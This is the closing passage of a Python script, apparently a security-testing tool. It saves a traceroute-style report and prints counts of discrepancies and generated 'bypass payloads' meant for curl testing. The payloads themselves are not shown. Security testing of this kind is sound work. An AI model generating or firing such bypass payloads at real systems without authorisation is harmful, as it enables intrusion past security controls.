        print(report)
        
        # Save report
        report_filename = f"app_traceroute_{int(time.time())}.txt"
        with open(report_filename, 'w') as f:
            f.write(report)
        print(f"\n📄 Full report saved to: {report_filename}")
        
        return tracer.chain_map
    
    # Run the analysis
    results = asyncio.run(run_analysis())
    
    print(f"\n🎉 Analysis complete!")
    print(f"📊 Results: {len(results['discrepancies'])} discrepancies, {len(results['bypasses'])} bypasses generated")
    print(f"💾 Check the JSON file for bypass payloads ready for curl testing!")


if __name__ == "__main__":
    main()